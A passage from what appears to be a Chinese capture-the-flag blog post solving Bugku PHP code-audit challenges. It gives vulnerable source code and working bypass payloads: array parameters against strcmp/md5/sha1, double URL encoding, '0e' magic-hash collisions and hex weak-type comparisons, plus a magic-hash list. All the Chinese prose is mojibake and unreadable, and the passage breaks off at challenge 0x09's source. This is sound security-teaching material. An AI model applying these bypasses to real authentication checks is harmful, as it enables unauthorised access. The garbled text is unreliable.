<td align="left">ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_REFS</code></td>
<td align="left">å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚è¿™æœ‰åŠ›åœ°è¡¨æ˜äº†å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†<code>array</code> å‚æ•°çš„å€¼ã€‚å¯ä»¥å•ç‹¬ä½¿ç”¨è¿™ä¸ªæ ‡å¿—æˆ–è€…åœ¨<code>flags</code> ä¸­ç”¨ OR ä¸å…¶å®ƒä»»ä½•æ ‡å¿—ç»“åˆä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td align="left">å¤‡æ³¨</td>
<td align="left">å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º <code>EXTR_OVERWRITE</code>ã€‚</td>
</tr>
</tbody></table>
</li>
<li><p><code>prefix</code></p>
<p>æ³¨æ„ ï¼š</p>
<p><code>prefix</code>ä»…åœ¨<code>flags</code>çš„å€¼æ˜¯<code>EXTR_PREFIX_SAME</code>ï¼Œ<code>EXTR_PREFIX_ALL</code>ï¼Œ<code>EXTR_PREFIX_INVALID</code>æˆ– <code>EXTR_PREFIX_IF_EXISTS</code>æ—¶éœ€è¦ã€‚</p>
<p>å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚å‰ç¼€å’Œæ•°ç»„é”®åä¹‹é—´ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ã€‚</p>
</li>
</ul>
<h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p> è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚</p>
<h2 id="0x01strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#0x01strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="0x01strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>0x01strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><h3 id="é¢˜ç›®åœ°å€-1"><a href="#é¢˜ç›®åœ°å€-1" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/6.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -1"><a href="#é¢˜ç›®æºç -1" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123; </span><br><span class="line">	if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ </span><br><span class="line">        &#x2F;&#x2F;æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ </span><br><span class="line">		die(&#39;Flag: &#39;.$flag); </span><br><span class="line">	else </span><br><span class="line">		print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>ç”¨æ•°ç»„ç»•è¿‡ï¼Œæ„é€ payload:</p>
<p><a href="http://123.206.87.240:9009/6.php?a%5B%5D=1">http://123.206.87.240:9009/6.php?a[]=1</a></p>
</li>
</ol>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku_dmsj_912k}</p>
<h2 id="0x02urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#0x02urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="0x02urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>0x02urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-2"><a href="#é¢˜ç›®åœ°å€-2" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/10.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -2"><a href="#é¢˜ç›®æºç -2" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">	echo(&quot;not allowed!&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;Access granted!&quot;;</span><br><span class="line">	echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li>æµè§ˆå™¨ä¼šå¯¹getå‚æ•°è¿›è¡Œä¸€æ¬¡URLç¼–ç ï¼Œæºç ä¸­è¿˜æœ‰ä¸€æ¬¡ï¼Œä¸¤æ¬¡ç¼–ç ç»•è¿‡éªŒè¯ã€‚</li>
<li>å¯¹hackerDJä¸¤æ¬¡URLç¼–ç æ„é€ payload:</li>
</ol>
<p><a href="http://123.206.87.240:9009/10.php?id=hackerDJ">http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</a></p>
<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku__daimasj-1t2}</p>
<h2 id="0x03md5-å‡½æ•°"><a href="#0x03md5-å‡½æ•°" class="headerlink" title="0x03md5()å‡½æ•°"></a>0x03md5()å‡½æ•°</h2><h3 id="é¢˜ç›®åœ°å€-3"><a href="#é¢˜ç›®åœ°å€-3" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/18.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -3"><a href="#é¢˜ç›®æºç -3" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">	if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">		print &#39;Your password can not be your username.&#39;;</span><br><span class="line">	else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>(md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))</code>åˆ¤æ–­æ˜¯å…¨ç­‰äºï¼Œæ‰€ä»¥ä¸å¯ä»¥ç”¨ç¢°æ’ï¼Œå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ã€‚</p>
</li>
<li><p>æ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/18.php?username%5B%5D=1&amp;password%5B%5D=2">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</a></p>
</li>
</ol>
<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>flag{bugk1u-ad8-3dsa-2}</p>
<h2 id="0x04md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#0x04md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="0x04md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>0x04md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-4"><a href="#é¢˜ç›®åœ°å€-4" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/13.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -4"><a href="#é¢˜ç›®æºç -4" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">	if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">		echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;false!!!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;please input a&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>$md51 == $md52</code>ä¸æ˜¯å…¨ç­‰äºï¼Œç”¨md5ç¢°æ’</p>
</li>
<li><p>æ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/13.php?a=240610708">http://123.206.87.240:9009/13.php?a=240610708</a></p>
</li>
</ol>
<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dmsj-am9ls}</p>
<h3 id="md5ç¢°æ’æ ·ä¾‹"><a href="#md5ç¢°æ’æ ·ä¾‹" class="headerlink" title="md5ç¢°æ’æ ·ä¾‹"></a>md5ç¢°æ’æ ·ä¾‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
<h2 id="0x05æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#0x05æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="0x05æ•°ç»„è¿”å›NULLç»•è¿‡"></a>0x05æ•°ç»„è¿”å›NULLç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-5"><a href="#é¢˜ç›®åœ°å€-5" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/19.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -5"><a href="#é¢˜ç›®æºç -5" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">		echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">	else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">		die(&#39;Flag: &#39; . $flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>é¢˜ç›®æç¤ºå¾ˆæ˜æ˜¾</p>
</li>
<li><p>æ•°ç»„æ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/19.php?password%5B%5D=1">http://123.206.87.240:9009/19.php?password[]=1</a></p>
</li>
</ol>
<h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><p>flag{ctf-bugku-ad-2131212}</p>
<h2 id="0x06å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#0x06å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="0x06å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>0x06å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-6"><a href="#é¢˜ç›®åœ°å€-6" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/22.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -6"><a href="#é¢˜ç›®æºç -6" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¼æ´</p>
</li>
<li><p>is_numeric()åˆ¤æ–­æ˜¯å¦ä¸ºnumberç±»å‹,int float</p>
</li>
<li><p>æ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/22.php?password=1337a">http://123.206.87.240:9009/22.php?password=1337a</a></p>
</li>
</ol>
<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku_null_numeric}</p>
<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="é¢˜ç›®åœ°å€-7"><a href="#é¢˜ç›®åœ°å€-7" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/20.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -7"><a href="#é¢˜ç›®æºç -7" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)&#123;</span><br><span class="line">	$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">	$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">	$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">	$number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">	&#x2F;&#x2F; Check all the input characters!</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;</span><br><span class="line">		&#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">		$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">		if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">			return &quot;flase&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($number &#x3D;&#x3D; $temp</span><br><span class="line">		return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¼æ´,<code>==</code>ä¼šå°†æ•°å­—è‡ªåŠ¨è½¬æ¢ä¸º16è¿›åˆ¶</p>
</li>
<li><p>å°†3735929054è½¬æ¢ä¸º16è¿›åˆ¶åŠ ä¸Šæ§åˆ¶å­—ç¬¦0x</p>
</li>
<li><p>åˆ©ç”¨è½¬æ¢ç»“æœ0xdeadc0deæ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/20.php?password=0xdeadc0de">http://123.206.87.240:9009/20.php?password=0xdeadc0de</a></p>
</li>
</ol>
<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><p>flag{Bugku-admin-ctfdaimash}</p>
<h2 id="å¼±ç±»å‹æ€»ç»“"><a href="#å¼±ç±»å‹æ€»ç»“" class="headerlink" title="å¼±ç±»å‹æ€»ç»“"></a>å¼±ç±»å‹æ€»ç»“</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">2 var_dump(&quot;admin&quot;&#x3D;&#x3D;0);  &#x2F;&#x2F;true</span><br><span class="line">3 var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true</span><br><span class="line">4 var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false</span><br><span class="line">5 var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">6 var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true </span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="åˆ¤æ–­æ¾æ•£æ€§"><a href="#åˆ¤æ–­æ¾æ•£æ€§" class="headerlink" title="==åˆ¤æ–­æ¾æ•£æ€§"></a>==åˆ¤æ–­æ¾æ•£æ€§</h4><ol>
<li>å½“ä¸€ä¸ªå­—ç¬¦ä¸²è¢«å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹:å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ã€‚å…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</li>
<li>åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†0eè¿™ç±»å­—ç¬¦ä¸²ï¼ŒPHPä¼šå°†å®ƒè§£æä¸ºç§‘å­¦è®¡æ•°æ³•ã€‚</li>
<li>åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†0xè¿™ç±»å­—ç¬¦ä¸²ï¼ŒPHPä¼šå°†å®ƒè§£æä¸ºåå…­è¿›åˆ¶ã€‚</li>
</ol>
<h4 id="å‡½æ•°æ¾æ•£æ€§"><a href="#å‡½æ•°æ¾æ•£æ€§" class="headerlink" title="å‡½æ•°æ¾æ•£æ€§"></a>å‡½æ•°æ¾æ•£æ€§</h4><ol>
<li><p><code>switch()</code></p>
<p>å¦‚æœ<code>switch</code>æ˜¯<strong>æ•°å­—ç±»å‹</strong>çš„<code>case</code>çš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸º<code>int</code>ç±»å‹ã€‚</p>
</li>
<li><p><code>in_array()</code></p>
<p><code>in_array(search,array,type)</code>: å¦‚æœç»™å®šçš„å€¼ search å­˜åœ¨äºæ•°ç»„ array ä¸­åˆ™è¿”å› trueï¼ˆ<strong>ç±»ä¼¼äº==**ï¼‰ã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º trueï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueï¼ˆ</strong>ç±»ä¼¼äº===**ï¼‰ã€‚å¦‚æœæ²¡æœ‰åœ¨æ•°ç»„ä¸­æ‰¾åˆ°å‚æ•°ï¼Œå‡½æ•°è¿”å› falseã€‚</p>
</li>
<li><p><code>is_numeric</code>()</p>
<p><code>is_numeric</code>åœ¨åšåˆ¤æ–­æ—¶å€™ï¼Œå¦‚æœæ”»å‡»è€…æŠŠpayloadæ”¹æˆåå…­è¿›åˆ¶0xâ€¦ï¼Œis_numericä¼šå…ˆå¯¹åå…­è¿›åˆ¶åšç±»å‹åˆ¤æ–­ï¼Œåå…­è¿›åˆ¶è¢«åˆ¤æ–­ä¸ºæ•°å­—å‹ä¸ºçœŸï¼Œå°±è¿›å…¥äº†æ¡ä»¶è¯­å¥ï¼Œå¦‚æœå†æŠŠè¿™ä¸ªä»£å…¥è¿›å…¥sqlè¯­å¥è¿›å…¥mysqlæ•°æ®åº“ï¼Œmysqlæ•°æ®åº“ä¼šå¯¹hexè¿›è¡Œè§£ææˆå­—ç¬¦ä¸²å­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå¦‚æœè¿™ä¸ªå­—æ®µå†è¢«å–å‡ºæ¥äºŒæ¬¡åˆ©ç”¨ï¼Œå°±å¯èƒ½é€ æˆäºŒæ¬¡æ³¨å…¥æ¼æ´ã€‚</p>
</li>
<li><p><code>strcmp</code>()</p>
<p><code>strcmp(string1ï¼Œstring2)</code>:æ¯”è¾ƒæ‹¬å·å†…çš„ä¸¤ä¸ªå­—ç¬¦ä¸²string1å’Œstring2ï¼Œå½“ä»–ä»¬ä¸¤ä¸ªç›¸ç­‰æ—¶ï¼Œè¿”å›0ï¼›string1çš„å¤§äºstring2æ—¶ï¼Œè¿”å›&gt;0;å°äºæ—¶è¿”å›&lt;0ã€‚åœ¨5.3åŠä»¥åçš„phpç‰ˆæœ¬ä¸­ï¼Œå½“strcmp()æ‹¬å·å†…æ˜¯ä¸€ä¸ªæ•°ç»„ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¹Ÿä¼šè¿”å›0ã€‚</p>
</li>
<li><p><code>md5</code>()</p>
<p><code>md5 ( string $str [, bool $raw_output = false ] )</code></p>
<p><code>md5()</code>éœ€è¦æ˜¯ä¸€ä¸ªstringç±»å‹çš„å‚æ•°ã€‚ä½†æ˜¯å½“ä½ ä¼ é€’ä¸€ä¸ªarrayæ—¶ï¼Œ<code>md5()</code>ä¸ä¼šæŠ¥é”™ï¼Œåªæ˜¯ä¼šæ— æ³•æ­£ç¡®åœ°æ±‚å‡ºarrayçš„md5å€¼ï¼Œè¿”å›nullï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»»æ„2ä¸ªarrayçš„md5å€¼éƒ½ä¼šç›¸ç­‰ã€‚</p>
</li>
</ol>
<h2 id="0x08sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#0x08sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="0x08sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>0x08sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-8"><a href="#é¢˜ç›®åœ°å€-8" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/7.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -8"><a href="#é¢˜ç›®æºç -8" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">	var_dump($_GET[&#39;name&#39;]);</span><br><span class="line">	echo &quot;&quot;;</span><br><span class="line">	var_dump($_GET[&#39;password&#39;]);</span><br><span class="line">	var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class="line">	var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class="line">	if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">		echo &#39;Your password can not be your name!&#39;;</span><br><span class="line">	else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;Invalid password.&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">	echo &#39;Login first&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-7"><a href="#writeup-7" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>æ•°ç»„ç»•è¿‡</p>
</li>
<li><p>æ„é€ payloadï¼š</p>
<p><a href="http://123.206.87.240:9009/7.php?name%5B%5D=1&amp;password%5B%5D=2">http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2</a></p>
</li>
</ol>
<h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><p>flag{bugkuâ€“daimasj-a2}</p>
<h2 id="0x09eregæ­£åˆ™-00æˆªæ–­"><a href="#0x09eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="0x09eregæ­£åˆ™%00æˆªæ–­"></a>0x09eregæ­£åˆ™%00æˆªæ–­</h2><h3 id="é¢˜ç›®åœ°å€-9"><a href="#é¢˜ç›®åœ°å€-9" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/5.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -9"><a href="#é¢˜ç›®æºç -9" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">		echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123;</span><br><span class="line">		if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE)&#123;&#x2F;&#x2F;strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">			die(&#39;Flag: &#39; . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo(&#39;have not been found&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &#39;Invalid password&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
